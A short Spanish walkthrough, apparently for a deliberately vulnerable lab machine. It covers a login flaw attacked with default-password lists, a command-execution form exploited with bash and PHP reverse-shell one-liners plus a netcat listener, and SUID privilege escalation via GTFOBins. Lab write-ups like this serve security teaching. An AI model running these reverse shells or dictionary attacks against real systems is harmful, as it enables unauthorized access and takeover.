1. Vulnerabilidad en el login: 

	El administrador a añadido a la base de datos usuarios por defecto que fácilmente se pueden encontrar en un diccionario.
	En concreto se ha utilizado las credenciales de las listas “mysql-betterdefaultpasslist.txt” y “postgres-betterdefaultpasslist.txt” de “Seclist”
	en la ubicación “SecLists/Passwords/Default-Credentials”. También se puede encontrar en el proyecto en “assets/listas/usuarioyPass.txt”. 

	Con un simple ataque de diccionario con alguna herramienta como “Burpsuite” y estas listas se consigue acceder fácilmente.


2. Vulnerabilidad de ejecución de comandos: 

	Estamos ante un sencillo caso de Ejecución de Comandos Remotos (Remote Command Execution, RCE). Podemos 
	ver un formulario en el que nos solicita un comando a ejecutar, y como podemos comprobar con un simple
	"cat /etc/passwd" ejecuta dicho comando. 

	Lo primero que se nos ocurre es lanzar una shell reversa con bash y ponernos en escucha con nc:

	bash -i >& /dev/tcp/172.17.0.1/4444 0>&1

	nc -lnvp 4444

	Pero esto no nos sirve ya que www-data ejecuta la shell /bin/sh y no es compatible con esa sintaxis. Tenemos otra alternativa, 
	lanzar una shell a través de otra aplicación y la que sabemos que está instalada es "php".

	php -r '$sock=fsockopen("172.17.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'


3. Vulnerabilidad para la elevación: 

	Ejecutando el comando “find / -perm /6000 2>/dev/null” nos aparecerá una lista de los archivos que tienen la caracterisitica SUID.
	Uno de estos será vulnerable, habrá que buscar cual está en la lista de “GTFOBins” (https://gtfobins.github.io/).

	Para explotarlo habrá que seguir los datos de la página de “GTFOBins” para cada caso.